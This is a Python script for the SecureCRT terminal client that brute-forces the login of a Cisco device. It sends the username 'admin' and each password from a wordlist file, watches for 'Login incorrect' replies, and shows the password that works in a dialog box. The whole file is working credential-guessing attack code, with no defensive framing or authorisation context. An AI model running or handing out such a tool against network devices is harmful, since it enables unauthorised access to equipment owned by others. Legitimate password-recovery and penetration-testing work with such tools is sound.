# $language = "Python3"
# $interface = "1.0"

import os
import sys
import time

# Avoids errors in IDE's that can't detect the crt variable:
global crt

# Adds script directory to PYTHONPATH,
# so we can import local modules when running common_tasks from SecureCRT
script_dir = None
if 'crt' in globals():
    script_dir, script_name = os.path.split(crt.ScriptFullName)
if script_dir not in sys.path:
    sys.path.append(script_dir)
else:
    script_dir, script_name = os.path.split(os.path.realpath(__file__))

# Local import
from crt_automation.sessions import CrtSession
from runners.cisco import cisco_runner


# Main function and script logic here:
def main():
    runner = cisco_runner.CiscoRunner(crt)

    action_delay = 2
    suffix_delay = 0  # in seconds
    timeout = 61  # in seconds
    # if this variable is blank, uses a wordlist file instead:
    wordlist_generator = ''
    wordlist_filepath = os.path.join(script_dir, 'ciscolist.txt')
    username = 'admin'
    login_responses = ['Login incorrect', 'login']
    # Index count starts from 1, 0 means none of the login_responses were received
    correct_login_index = 0

    if not wordlist_generator:
        with open(wordlist_filepath) as wordlist:
            for word in wordlist:
                runner.crt.Screen.Send(username + '\r')
                time.sleep(action_delay)
                runner.crt.Screen.Send(word + "\r")
                response = runner.crt.Screen.WaitForStrings(login_responses, timeout)
                if response == correct_login_index:
                    crt.Dialog.MessageBox("The correct password is: {}".format(word))
                    break
                time.sleep(suffix_delay)
    else:  # TODO: implement wordlist generator
        pass

    return


main()
